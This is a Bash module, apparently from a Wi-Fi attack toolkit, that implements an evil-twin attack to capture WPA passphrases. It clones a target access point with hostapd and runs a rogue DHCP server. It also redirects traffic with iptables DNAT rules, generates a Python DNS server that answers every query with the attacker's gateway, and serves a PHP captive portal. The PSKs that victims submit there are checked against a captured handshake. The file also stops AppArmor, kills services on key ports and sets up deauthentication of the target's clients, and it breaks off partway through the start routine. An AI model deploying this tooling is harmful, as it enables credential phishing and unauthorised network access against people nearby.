#!/usr/bin/env bash

# Copyright 2022 Faither

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights to
# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
# the Software, and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

############################################################
# Initials                                                 #
############################################################

#############
# Constants #
#############

declare -r _Lib_twin=1;
declare -r _Twin_sourceFilepath="$( readlink -e -- "${BASH_SOURCE[0]:-$0}" 2> '/dev/null'; )";
declare -r _Twin_sourceDirpath="$( dirname -- "$_Twin_sourceFilepath" 2> '/dev/null'; )";

[[ ! -f "$_Twin_sourceFilepath" || ! -d "$_Twin_sourceDirpath" ]] && exit 199;

# File names

# Configs
declare -r Twin_hostapdConfigFilename='hostapd';
declare -r Twin_iptablesConfigFilename='iptables';
declare -r Twin_dhcpdConfigFilename='dhcpd';
declare -r Twin_pydnsConfigFilename='pydns';
declare -r Twin_lighttpdConfigFilename='lighttpd';

# PSK
declare -r Twin_pskCheckedFilenamePrefix='checked';
declare -r Twin_pskTryFilenamePrefix='psk-try';
declare -r Twin_pskLogFilename='psk.log';
declare -r Twin_pskFilenamePrefix='psk';

# Directory names

# Web
declare -r Twin_webDirname='web';
declare -r Twin_webRootDirname='public';
declare -r Twin_pskTryDirname='psk_tries';
declare -r Twin_psksDirname='psks';

# Directory paths

declare -r Twin_pskTryDirpath="${Environment_WebDirpath}/${Twin_pskTryDirname}";

# File paths

# Configs
declare -r Twin_iptablesConfigFilepath="${Environment_ConfigsDirpath}/${Twin_iptablesConfigFilename}";
declare -r Twin_pydnsConfigFilepath="${Environment_ConfigsDirpath}/${Twin_pydnsConfigFilename}";
declare -r Twin_lighttpdConfigFilepath="${Environment_ConfigsDirpath}/${Twin_lighttpdConfigFilename}";
declare -r Twin_hostapdConfigFilepath="${Environment_ConfigsDirpath}/${Twin_hostapdConfigFilename}";
declare -r Twin_dhcpdConfigFilepath="${Environment_ConfigsDirpath}/${Twin_dhcpdConfigFilename}";

# PSK
declare -r Twin_pskLogFilepath="${Environment_SessionDirpath}/${Twin_pskLogFilename}";
declare -r Twin_psksDirpath="${Environment_workspaceDirpath}/${Twin_psksDirname}";

#############
# Variables #
#############

Twin_ipGatewayDefault='192.168.1.1';

############################################################
# Functions                                                #
############################################################

Twin_previewAPDetails()
{
	declare markChar=$'\'';

	if [[ "$1" == '-c' ]];
	then
		markChar="$2";
		shift 2;
	fi

	declare __apBssid="$1";
	declare __apChannel="$2";
	declare __apSsid="$3";

	########
	# Main #
	########

	printf "[ B ${markChar}%s${markChar}, C ${markChar}%s${markChar}, S ${markChar}%s${markChar} ]" \
		"$( [[ "$__apBssid" != '' ]] && printf '%s' "$__apBssid"; )" \
		"$( [[ "$__apChannel" != '' ]] && printf '%s' "$__apChannel"; )" \
		"$( [[ "$__apSsid" != '' ]] && printf '%s' "$__apSsid"; )";
}

Twin_network()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?-d;?-i;-r;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_hotspot] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare device="${args[0]}";
	declare ipGateway="${args[1]}";
	declare restore="${args[2]}";
	declare verbose="${args[3]}";

	########
	# Main #
	########

	if [[ "$restore" != 0 ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Restoring network configuration';

		if Base_FsExists -t 1 -- "$Twin_iptablesConfigFilepath";
		then
			iptables-restore < "$Twin_iptablesConfigFilepath";
		else
			iptables --flush;
			iptables --table nat --flush ;
			iptables --delete-chain;
			iptables --table nat --delete-chain ;
		fi

		return 0;
	fi

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Preparing twin network';

	if [[ "$device" == '' || "$ipGateway" == '' ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Could not prepare twin network. Not enough data.';

		return 1;
	fi

	# Interface

	declare Twin_network_interface;

	if ! Interface_ModeSet -im 0 -- "$device" || ! Interface_FromDevice -o Twin_network_interface -d "$device";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Could not prepare twin network. Failed to reset device mode: \'%s\'' -- "$device";

		return 1;
	fi

	declare interface="$Twin_network_interface";

	# Start

	# If iptables initial rules were not saved
	if ! Base_FsExists -t 1 -- "$Twin_iptablesConfigFilepath";
	then
		iptables-save > "$Twin_iptablesConfigFilepath";
	fi

	declare subnet="${ipGateway%\.*}";

	# Terminate interfering services
	service apparmor stop &>> "$_Main_Dump"; # Security measure (blocks certain commands, by default)
	service systemd-resolved stop &>> "$_Main_Dump"; # 53 port

	# Terminate interfering processes (on certain ports)
	fuser -n tcp -k 53 67 80 443 &>> "$_Main_Dump";
	fuser -n udp -k 53 67 80 443 &>> "$_Main_Dump";

	# Create significant network rules (addresses, subnets, firewall)
	if
		! ifconfig "$interface" up &>> "$_Main_Dump" ||
		! ifconfig "$interface" "$ipGateway" netmask 255.255.255.0 &>> "$_Main_Dump" ||
		! route add -net "${subnet}.0" netmask 255.255.255.0 gw "$ipGateway" &>> "$_Main_Dump" ||
		! sysctl -w net.ipv4.ip_forward=1 &>> "$_Main_Dump" ||
		! iptables --flush &>> "$_Main_Dump" ||
		! iptables --table nat --flush &>> "$_Main_Dump" ||
		! iptables --delete-chain &>> "$_Main_Dump" ||
		! iptables --table nat --delete-chain &>> "$_Main_Dump" ||
		! iptables -P FORWARD ACCEPT &>> "$_Main_Dump" ||
		! iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j DNAT --to-destination "${ipGateway}:80" &>> "$_Main_Dump" ||
		# Just in case? :)
		! iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -j DNAT --to-destination "${ipGateway}:443" &>> "$_Main_Dump" ||
		! iptables -A INPUT -p tcp -i "$interface" --sport 443 -j ACCEPT &>> "$_Main_Dump" ||
		! iptables -A OUTPUT -p tcp -o "$interface" --dport 443 -j ACCEPT &>> "$_Main_Dump" ||
		! iptables -t nat -A POSTROUTING -o "$interface" -j MASQUERADE &>> "$_Main_Dump";
	then
		return 1;
	fi

	return 0;
}

Twin_hotspot()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'@1/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/' \
		'?!-d;?!-a;?!-c;?!-s;?--bm;?-x;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_hotspot] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare device="${args[0]}";
	declare apBssid="${args[1]}";
	declare apChannel="${args[2]}";
	declare apSsid="${args[3]}";
	declare __processBindMeta="${args[4]}";
	declare windowParameters="${args[5]}";
	declare verbose="${args[6]}";

	########
	# Main #
	########

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Starting AP (%s) %s' -- "$device" "$( Twin_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )";

	if [[ "$__processBindMeta" != '' ]] && ! Environment_ProcessBindTerminate --bm "$__processBindMeta";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' \
			-nmf $'Failed to start AP %s. Could not terminate related bound process: "{{@clRed}}%s{{@clDefault}}"' -- \
			"$( Twin_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )" "$__processBindMeta";

		return 1;
	fi

	# Interface

	declare Twin_hotspot_interface;

	if ! Interface_ModeSet -im 0 -- "$device" || ! Interface_DeviceMac -m "$apBssid" -d "$device" || ! Interface_FromDevice -o Twin_hotspot_interface -d "$device";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start AP %s (failed to prepare interface of %s)' -- "$apBssid" "$device";

		return 1;
	fi

	declare interface="$Twin_hotspot_interface";

	# Config

	if ! Base_FsWrite -f "$Twin_hostapdConfigFilepath" -- \
"interface=${interface}
driver=nl80211
ssid=${apSsid}
channel=${apChannel}
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start AP. Could not create Hostapd config: \'%s\'' -- \
			"${Twin_hostapdConfigFilepath}";

		return 1;
	fi

	# Start

	declare logName="$( Misc_RandomString -l 8 )";
	declare logFilepath="${Environment_LogsDirpath}/hostapd_${logName}.log";

	Environment_TerminalStart --bm "$__processBindMeta" -x "$windowParameters" \
		-Tt "$( printf $'AP on \'%s\' [ B \'%s\', C \'%s\', S \'%s\' ]' "$interface" "$apBssid" "$apChannel" "$apSsid" )" -- \
		"hostapd '${Twin_hostapdConfigFilepath}' 2>&1 | tee -a '${logFilepath}'"; # hotspot -dK
	
	declare returnCodeTemp=$?;

	if [[ "$returnCodeTemp" != 0 ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start AP (code %s) %s' -- \
			"$returnCodeTemp" "$( Twin_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )";

		return 1;
	fi

	return 0;
}

Twin_dhcp()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?!-d;?!-i;?--bm;?-x;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_dhcp] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare device="${args[0]}";
	declare ipGateway="${args[1]}";
	declare __processBindMeta="${args[2]}";
	declare windowParameters="${args[3]}";
	declare verbose="${args[4]}";

	########
	# Main #
	########

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Starting DHCP server';

	if [ "$__processBindMeta" != '' ] && ! Environment_ProcessBindTerminate --bm "$__processBindMeta";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' \
			-nmf $'Failed to start DHCP server. Could not terminate related child process: "{{@clRed}}%s{{@clDefault}}"' -- "$__processBindMeta";

		return 1;
	fi

	# Interface

	declare Twin_dhcp_interface;

	if ! Interface_ModeSet -im 0 -- "$device" || ! Interface_FromDevice -o Twin_dhcp_interface -d "$device";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start %s DHCP server (failed to prepare interface of %s)' -- "$ipGateway" "$device";

		return 1;
	fi

	declare interface="$Twin_dhcp_interface";

	# Config

	declare subnet="${ipGateway%\.*}";
	declare dhcpdLeasesFilepath="${Twin_dhcpdConfigFilepath}_leases"

	if ! Base_FsWrite -f "$Twin_dhcpdConfigFilepath" -- \
"authoritative;
default-lease-time 600;
max-lease-time 7200;

subnet ${subnet}.0 netmask 255.255.255.0 {
	option broadcast-address ${subnet}.255;
	option routers ${ipGateway};
	option subnet-mask 255.255.255.0;
	option domain-name-servers ${ipGateway};
	range ${subnet}.100 ${subnet}.250;
}";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start DHCP. Could not create DHCP config: \'%s\'' -- \
			"${Twin_dhcpdConfigFilepath}";

		return 1;
	fi

	if ! Base_FsWrite -f "$dhcpdLeasesFilepath" -- "";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start DHCP. Could not create DHCP leases file: \'%s\'' -- \
			"${Twin_dhcpdConfigFilepath}";

		return 1;
	fi

	# Start

	declare logName="$( Misc_RandomString -l 8 )";
	declare logFilepath="${Environment_LogsDirpath}/dhcpd_${logName}.log";

	Environment_TerminalStart --bm "$__processBindMeta" -x "$windowParameters" \
		-Tt "$( printf $'DHCP server on \'%s\' (%s, %s.100-250)' "$interface" "$ipGateway" "$subnet" )" -- \
		"dhcpd -d -f -lf '${dhcpdLeasesFilepath}' -cf '${Twin_dhcpdConfigFilepath}' ${interface} 2>&1 | tee -a '${logFilepath}'";
	
	declare returnCodeTemp=$?;

	if [[ "$returnCodeTemp" != 0 ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start DHCP server (code %s)' -- "$returnCodeTemp";

		return 1;
	fi
}

Twin_dnsCustom()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?!-i;?-x;?--bm;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_dnsCustom] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare ipGateway="${args[0]}";
	declare windowParameters="${args[1]}";
	declare __processBindMeta="${args[2]}";
	declare verbose="${args[3]}";

	########
	# Main #
	########

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Starting DNS server (%s)' -- "$ipGateway";

	# Create a quite simple(but enough) python DNS script
	if ! Base_FsWrite -f "$Twin_pydnsConfigFilepath" -- \
"#!/bin/python

import sys
import socket
import time

if len( sys.argv ) != 2:
	print 'Please specify the gateway address'

	exit(1)

class QueryDNS:
	def __init__( self, data ):
		self.data = data
		self.domain = ''
		tipo = ( ord( data[2] ) >> 3 ) & 15

		if tipo == 0:
			ini = 12
			lon = ord( data[ini] )

			while lon != 0:
				self.domain += data[ini + 1:ini + lon + 1]
				ini += lon + 1
				lon = ord( data[ini] )

				if lon != 0:
					self.domain += '.'

	def respond( self, ip ):
		packet = ''

		if self.domain:
			packet += self.data[:2] + \"\x81\x80\"
			packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
			packet += self.data[12:]
			packet += '\xc0\x0c'
			packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
			packet += str.join( '', map( lambda x: chr( int( x ) ), ip.split( '.' ) ) )

		return packet

if __name__ == '__main__':
	gateway = sys.argv[1]
	packetCount = 0

	print
	print '  > Domain Name System on \"%s\"' % gateway
	print '  > Started at \"%s\" (ignores \"%s\", \"127.0.0.1\")' % (time.strftime('%T %D'), gateway)
	print

	udps = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
	udps.bind((gateway, 53)) # ('', 53) ?

	try:
		while 1:
			data, address = udps.recvfrom(1024)

			if len(data) > 0 and address[0] != gateway and address[0] != '127.0.0.1':
				p = QueryDNS(data)
				domainPrepared = (p.domain[:20] + '..') if len(p.domain) > 20 else p.domain
				print '  [%s] [%s] %s: \"%s\"' % (time.strftime('%T %D'), packetCount + 1, address[0], p.domain)
				udps.sendto(p.respond(gateway), address)
				packetCount += 1
	except KeyboardInterrupt:
		udps.close()
		print '  [ ! ] Terminated'"
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start DNS server. Could not create script: \'%s\'' -- \
			"${Twin_pydnsConfigFilepath}";

		return 1;
	fi

	declare logName="$( Misc_RandomString -l 8 )";
	declare logFilepath="${Environment_LogsDirpath}/pydns_${logName}.log"

	Environment_TerminalStart --bm "$__processBindMeta" -x "$windowParameters" -Tt "$( printf 'DNS (%s)' "$ipGateway" )" -- \
		"python -u '${Twin_pydnsConfigFilepath}' '${ipGateway}' 2>&1 | tee -a '${logFilepath}'";
	
	declare returnCodeTemp=$?;

	if [[ "$returnCodeTemp" != 0 ]]
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start a DNS server (code %s)' -- "$returnCodeTemp";

		return 1;
	fi
}

Twin_httpServer()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?-x;?--bm;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_httpServer] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare windowParameters="${args[0]}";
	declare __processBindMeta="${args[1]}";
	declare verbose="${args[2]}";

	########
	# Main #
	########

	if ! Base_FsExists -t d -- "$Twin_pskTryDirpath" && ! Base_FsDirectoryCreate -p -- "$Twin_pskTryDirpath";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Failed to create directory for PSK tries';

		return 1;
	fi

	killall lighttpd &>> "$_Main_Dump";
	declare logName="$( Misc_RandomString -l 8 )";
	declare lighttpdErrorLogFilepath="${Environment_LogsDirpath}/lighttpd_${logName}_error.log";
	declare lighttpdAccessLogFilepath="${Environment_LogsDirpath}/lighttpd_${logName}_access.log";
	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nf $'Starting HTTP server';

	# Create a quite simple(but enough) python DNS script
	if ! Base_FsWrite -f "$Twin_lighttpdConfigFilepath" -- \
"server.document-root = \"${Environment_WebRootDirpath}/\"

server.modules = (
	\"mod_access\",
	\"mod_alias\",
	\"mod_accesslog\",
	\"mod_fastcgi\",
	\"mod_redirect\",
	\"mod_rewrite\"
)

fastcgi.server = (
	\".php\" => 
	(
		(
			\"bin-path\" => \"/usr/bin/php-cgi\",
			\"socket\" => \"/tmp/php.socket\"
		)
	)
)

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"

mimetype.assign = (
	\".html\" => \"text/html\",
	\".htm\" => \"text/html\",
	\".txt\" => \"text/plain\",
	\".jpg\" => \"image/jpeg\",
	\".png\" => \"image/png\",
	\".css\" => \"text/css\"
)

# fastcgi.debug = 1

server.error-handler-404 = \"/\"
server.errorlog   = \"${lighttpdErrorLogFilepath}\"
accesslog.filename = \"${lighttpdAccessLogFilepath}\"

static-file.exclude-extensions = ( \".fcgi\", \".php\", \"~\", \".inc\", \"cfg\", \"config\" )
index-file.names = ( \"index.htm\", \"index.html\", \"index.php\" )

\$SERVER[\"socket\"] == \":443\" {
	url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
}

\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
}"
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start a web server. Couldn\'t create a lighttpd config: \'%s\'' -- \
			"${Twin_lighttpdConfigFilepath}";

		return 1;
	fi

	declare logFilepath="${Environment_LogsDirpath}/lighttpd_${logName}.log";

	Environment_TerminalStart --bm "$__processBindMeta" -x "$windowParameters" -Tt 'HTTP server (*:80)' -- \
		"lighttpd -D -f '${Twin_lighttpdConfigFilepath}' 2>&1 \
			| tee -a '${logFilepath}' \
			| tail -F '${logFilepath}' '${lighttpdAccessLogFilepath}' '${lighttpdErrorLogFilepath}' \
				2> '$_Main_Dump'";
	
	declare returnCodeTemp=$?;

	if [[ "$returnCodeTemp" != 0 ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to start web server (code %s)' -- "$returnCodeTemp";

		return 1;
	fi
}

############################################################
# Methods                                                  #
############################################################

Twin_PskVerify()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?!-f;?!-a;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_PskVerify] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare __handshakeFilepath="${args[0]}";
	declare __apBssid="${args[1]}";
	declare __verbose="${args[2]}";
	declare __psks=( "${args[@]:3}" );

	########
	# Main #
	########

	declare pskIndex;

	for (( pskIndex = 0; pskIndex < ${#__psks[@]}; pskIndex++ ));
	do
		declare psk="${__psks[$pskIndex]}";

		if Handshake_PskVerify -f "$__handshakeFilepath" -a "$__apBssid" -- "$psk";
		then
			[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 's' -nmTf $'PSK \'{{@clLightGreen}}%s{{@clDefault}}\' (%s) matches handshake' "$psk" "${#psk}";

			return 0;
		fi

		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'i' -nmTf $'PSK \'{{@clLightRed}}%s{{@clDefault}}\' (%s) mismatches handshake' "$psk" "${#psk}";
	done

	return 1;
}

# Returns XX:XX:XX:XX:XR:XX
Twin_BssidRand()
{
	declare __apBssid="$1";
	shift;
	declare __apRandBssid="$__apBssid";

	while [[ "$__apRandBssid" == "$__apBssid" ]];
	do
		declare randChar="$( Misc_RandomString -l 1 -c '0123456789ABCDEF' )";

		declare __apRandBssid="${__apBssid:0:13}${randChar}${__apBssid:14}";
	done

	printf '%s' "$__apRandBssid";
}

Twin_Start()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?!-D;?!-d;?!-a;?!-c;?!-s;?!-h;?-o;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Twin_Start] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare deviceMain="${args[0]}";
	declare deviceSecondary="${args[1]}";
	declare apTargetBssid="${args[2]}";
	declare apTargetChannel="${args[3]}";
	declare apTargetSsid="${args[4]}";
	declare __handshakeFilepath="${args[5]}";
	declare outputVariableReferenceName="${args[6]}";
	declare verbose="${args[7]}";

	if [ "$outputVariableReferenceName" != '' ];
	then
		if [[
			"$outputVariableReferenceName" == 'Twin_Start_outputVariableReference' ||
			"$outputVariableReferenceName" == 'Twin_Start_outputVariableReferenceBssid' ||
			"$outputVariableReferenceName" == 'Twin_Start_outputVariableReferenceSsid' ||
			"$outputVariableReferenceName" == 'Twin_Start_outputVariableReferenceHandshakeFilepath' ||
			"$outputVariableReferenceName" == 'Twin_Start_outputVariableReferencePsk' ||
			"$outputVariableReferenceName" == 'Twin_Start_outputVariableReferenceFilepath'
		]];
		then
			Misc_PrintF -v 1 -t 'f' -nf $'[Twin_Start] Output variable reference interference: \'%s\'' -- \
				"$( Misc_ArrayJoin -- "$@" )";

			return 100;
		fi

		declare -n Twin_Start_outputVariableReference="$outputVariableReferenceName";
		declare -n Twin_Start_outputVariableReferenceBssid="${outputVariableReferenceName}Bssid";
		declare -n Twin_Start_outputVariableReferenceSsid="${outputVariableReferenceName}Ssid";
		declare -n Twin_Start_outputVariableReferenceHandshakeFilepath="${outputVariableReferenceName}HandshakeFilepath";
		declare -n Twin_Start_outputVariableReferencePsk="${outputVariableReferenceName}Psk";
		declare -n Twin_Start_outputVariableReferenceFilepath="${outputVariableReferenceName}Filepath";
		Twin_Start_outputVariableReference='';
		Twin_Start_outputVariableReferenceBssid='';
		Twin_Start_outputVariableReferenceSsid='';
		Twin_Start_outputVariableReferenceHandshakeFilepath='';
		Twin_Start_outputVariableReferencePsk='';
		Twin_Start_outputVariableReferenceFilepath='';
	fi

	declare apTargetBssid="${apTargetBssid^^}"; # Capitalize BSSID to match airodump-ng output

	########
	# Main #
	########

	if printf '%s' "$apSsid" | grep -q $',\|\'\|\\\\';
	then
		Misc_PrintF -v 2 -t 'e' -nf $'Characters [comma, \', \\\\] are currently unsupported in SSID for twin attack: \'%s\'' -- "$apSsid";

		return 1;
	fi

	# Generate a random AP BSSID, if no valid is available
	# if [[ ! "$apTargetBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]];
	# then
	# 	declare apTargetBssid="$( Misc_RandomString -l 12 -c '0123456789ABCDEF' )" | sed -e 's/.\{2\}/&:/g' -e 's/.$//';
	# fi

	# Check initial target data

	declare validHandshake=0;

	if Base_FsExists -t 1 -- "$__handshakeFilepath" && Handshake_Verify -fc "$__handshakeFilepath" -b "$apTargetBssid" -s "$apTargetSsid";
	then
		declare validHandshake=1;
	fi

	# If BSSID, SSID or handshake are invalid
	if [[ ! "$apTargetBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ || "$validHandshake" != 1 ]] || (( ${#apTargetSsid} == 0 || ${#apTargetSsid} > 32 ))
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nTf $'Could not start twin attack. Not enough target details available (missing %s).'\
			"$(
				declare missing=();
				[[ ! "$apTargetBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] && missing+=( 'BSSID' );
				(( ${#apTargetSsid} == 0 )) || (( ${#apTargetSsid} > 32 )) && missing+=( 'SSID' );
				[[ "$validHandshake" != 1 ]] && missing+=( 'handshake' );

				Misc_ArrayJoin '' '' ', ' "${missing[@]}";
			)";

		return 1;
	fi

	# Set the initial target AP data
	declare apBssid="$apTargetBssid";
	declare apChannel="$apTargetChannel";
	declare apSsid="$apTargetSsid";
	declare ipGateway="$Twin_ipGatewayDefault";
	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'm' -nmTf $'Starting twin attack (PSK capture) %s' -- "$( Twin_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )";
	declare twinTimeStart="$( Misc_DateTime )";

	if ! Base_FsExists -t d -- "$Twin_psksDirpath" && ! Base_FsDirectoryCreate -p -- "$Twin_psksDirpath";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nf $'Failed to create directory for correct PSKs';

		return 2;
	fi

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nmTf $'Handshake: \'%s\'' -- "$( basename -- "$__handshakeFilepath" 2> '/dev/null'; )";

	# Process metas

	declare processMetaPrefixTwin='twin_1';
	declare processMetaDhcp_1="${processMetaPrefixTwin}_dhcp_1";
	declare processMetaHotspot_1="${processMetaPrefixTwin}_twin-ap_1";
	declare processMetaPyDns_1="${processMetaPrefixTwin}_dns_1";
	declare processMetaWeb_1="${processMetaPrefixTwin}_web_1";
	declare processMetaCompanion_1="${processMetaPrefixTwin}_companion_1";
	declare processMetaAttackDeauth_1="${processMetaPrefixTwin}_attack_deauth_1";

	# Window parameters

	declare windowParametersTwinMain="$( Environment_WindowSector -H 2 -V 2 -h 0 -v 1 -t 0 -r 0 -b 0 -l 0 )";
	declare windowParametersTwinAttackDeauth="$( Environment_WindowSector -H 2 -V 4 -h 1 -v 2 )";
	declare windowParametersTwinCompanion="$( Environment_WindowSector -H 2 -V 4 -h 1 -v 3 )";
	declare windowParametersTwinWebServer="$( Environment_WindowSector -H 2 -V 4 -h 0 -v 0 )";
	declare windowParametersTwinPyDns="$( Environment_WindowSector -H 2 -V 4 -h 0 -v 1 )";
	declare windowParametersTwinDhcp="$( Environment_WindowSector -H 2 -V 4 -h 1 -v 1 )";
	declare windowParametersTwinHotspot="$( Environment_WindowSector -H 2 -V 4 -h 1 -v 0 )";

	#
	# Twin main
	#

	Environment_WindowArrange --bm 'main_twincy_terminal' -- $windowParametersTwinMain;

	# The psk variable
	declare pskCorrect;
	unset pskCorrect;
	declare pskCorrect;

	# Timeouts
	declare twinCycleWaitSeconds=0;
	declare pskVerifyRestartTimeout=1; # Check PSK each N seconds
	declare companionFirstCheckTimeout=10; # The timeout before first companion data check after its (re)start
	declare companionRestartTimeout=30; # Restart companion each N seconds
	declare deauthRestartTimeout=60; # Restart deauth each N seconds
	declare apTargetOnlineTimeout=30; # Target AP's maximum offline in N seconds

	# Times
	declare apTargetOnlineTime=-1;
	declare companionStartTime=0;
	declare pskVerifyTime=0;
	declare attackDeauthStartTime=0;

	# Counters
	declare pskVerifyCount=0;
	declare attackDeauthStartCount=0;
	declare companionStartCount=0;
	declare dnsStartCount=0;
	declare httpStartCount=0;
	declare dhcpStartCount=0;
	declare apStartCount=0;
	declare mainCycleCount=0;

	# Deauth
	declare attackDeauthTypes=( 0 );

	# Target AP status
	declare apTargetIsActive=0;
	declare apTargetDataStatus=0; # (0 ~ default, 1 ~ set target AP's data to initial, 2 ~ updated from companion)

	# Terminate all related processes
	Environment_ProcessBindTerminate --bm "$processMetaPrefixTwin";

	# Configure the network (iptables)

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nT -- $'Preparing twin network';

	if ! Twin_network -d "$deviceMain" -i "$ipGateway";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to prepare twin network';

		return 1;
	fi

	# Start a DNS server

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nT -- $'Starting DNS server';

